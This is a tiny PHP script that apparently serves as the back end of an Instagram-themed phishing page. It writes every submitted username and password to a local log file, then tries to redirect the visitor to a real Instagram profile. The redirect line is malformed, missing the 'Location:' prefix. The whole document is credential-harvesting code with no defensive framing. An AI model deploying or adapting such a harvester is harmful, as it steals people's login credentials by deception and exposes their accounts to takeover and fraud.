<?php 
$fp = fopen ("log.txt", "a");
fputs($fp, "\n");
fputs ($fp, "login : ".$_POST['username']);
fputs ($fp, " / password : ".$_POST['password']);
fclose ($fp);
?>
<?php 
header('https://www.instagram.com/thelinuxproject/?hl=fr'); 
exit;
?>
